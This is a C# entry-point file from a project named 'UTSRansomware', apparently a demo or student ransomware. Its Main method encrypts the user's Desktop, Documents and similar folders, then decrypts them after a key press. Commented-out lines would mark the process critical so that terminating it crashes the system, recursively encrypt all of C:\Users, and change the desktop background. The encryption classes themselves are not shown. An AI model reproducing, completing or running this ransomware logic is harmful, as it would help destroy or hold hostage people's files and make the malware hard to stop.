namespace UTSRansomware
{
    internal class Program
    {
        // Entry point of program
        static void Main(string[] args)
        {

            // Will mark the process as critical causing BSOD if terminated

            //Utils.makeProcessUnkillable();

            // Creates new encryptor class and and encrypt "special" directories e.g Desktop, Documents, etc
            Encryptor encryptor = new Encryptor();
            encryptor.EncryptSpecialDirectories();

            // Will recursively encrypt all files, currently throws a lot of errors

            //encryptor.EncryptDirectory(@"C:\Users");

            // Sets desktop background to specifc image
            //Utils.SetDesktopBackground(@"C:\Users\Programming\Desktop\Background.jpg");

            // Starts decryption prcoess after key press
            Console.WriteLine("Press any key to decrypt files");
            Console.ReadKey();
            Decryptor decryptor = new Decryptor(encryptor.key, encryptor.iv);
            decryptor.DecryptSpecialDirectories();

            // decryptor.DecryptDirectory(@"C:\Users");
            Console.ReadKey();
        }
    }
}